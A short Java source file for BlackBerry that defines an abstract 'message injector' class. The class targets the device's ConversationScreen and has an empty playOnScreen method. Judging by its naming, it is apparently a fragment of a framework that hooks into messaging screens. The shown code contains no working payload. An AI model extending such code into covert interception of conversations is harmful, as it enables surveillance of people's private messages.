package blackberry.injection.injectors;

import net.rim.device.api.ui.Screen;

public abstract class AMessageInjector extends AInjector {

    public final String[] getWantedScreen() {
        return new String[]{"ConversationScreen"};
    }

    public final void playOnScreen(Screen screen) {

    }

}
